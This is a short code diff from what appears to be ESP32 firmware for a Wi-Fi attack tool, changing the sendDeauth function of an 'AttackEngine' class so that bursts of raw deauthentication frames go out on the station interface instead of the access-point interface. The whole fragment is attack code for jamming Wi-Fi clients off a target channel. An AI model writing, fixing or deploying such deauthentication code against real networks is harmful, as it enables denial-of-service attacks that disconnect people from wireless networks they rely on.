@@ -320,7 +320,7 @@ void AttackEngine::sendDeauth() {
     buildDeauthPacket();
     esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);
     for(int i=0; i<DEAUTH_BURST_SIZE; i++) {
-        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 26, false);
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
         vTaskDelay(DEAUTH_PACKET_DELAY / portTICK_PERIOD_MS); 
     }
 }
